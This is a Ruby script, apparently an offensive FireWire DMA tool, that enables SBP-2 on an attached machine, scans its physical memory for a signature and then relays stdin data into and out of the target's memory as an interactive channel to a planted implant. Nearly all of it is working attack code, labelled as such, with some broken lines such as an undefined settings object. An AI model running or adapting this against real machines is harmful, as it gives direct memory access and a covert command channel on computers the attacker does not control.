#!/usr/bin/env ruby
require '../forensic1394/bus'
require 'pp'
require 'fcntl'


def run(context)
    # first 17 characters of md5sum of awesome with the 9 removed
    sig = "70c1db56f301ce55"
    off = 0x00
    
    # Print phase, method and patch parameters
    puts '        Using signature: %s' % sig
    puts '        Using offset:    %x' % off

    # Initialize
    d = initialize_fw(d)
     
    # Find memory size
    puts 'Detecting memory size...'
    memsize = 4 * 1024 * 1024  * 1024
    puts '%d MiB main memory detected' % (Integer(memsize)/(1024 * 1024)) 

    # Attack
    puts 'Starting attack...'
    begin        
    # Find
        addr = findsig(d, sig, off, memsize)
        if !addr
            settings.success = False
        else
            puts '+ Signature found at 0x%x.' % addr
            while (1)
                data = ''
                begin
                    STDIN.flush
                    data = STDIN.read_nonblock(255)
                rescue
                    data = ''
                end
                d.write(addr + 18, data)
                d.write(addr + 17, sprintf("%c", data.length))
                d.write(addr + 16, '^')
                while (d.read(addr + 16, 1) != '~') 
                    sleep(1)
                end
                len = d.read(addr + 17, 1)
                data = d.read(addr + 18, len.ord)
                print data
            end
        end 
    rescue IOError => e
        success = false
        puts '-', 'I/O Error, make sure FireWire interfaces are properly connected.'
        puts e.message
    end

    if !success
        fail('Failed to dump.')
    end 

                    
    if not settings.success
        fail('Signature not found.')
    end
end

def initialize_fw(d)
    b = Bus.new
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()

    begin
        for i in 3.downto(1)
            puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
            STDOUT.flush
            sleep(1)
        end
    rescue 
        puts 'Interrupted'
    end 

    # Open the first device
    d = b.devices
   
    if (d.length > 0)
        d = d[0]
        d.open()
        puts ''
    else
        raise 'nothing connected'
    end

    return d
end 

def findsig(d, sig, off, memsize)
    pagesize = 4096 
    one_mb = 1 * 1024 * 1024
    for addr in (one_mb + off..memsize).step(pagesize)
        data = d.read(addr, sig.length)
        if (data  == sig)
            return addr
        end
    end
    print()
    return
end

def fail(msg)
    puts "\n [!] Attack unsuccessful."
    puts msg
    exit
end

if __FILE__ == $0
    run( ARGV )
end

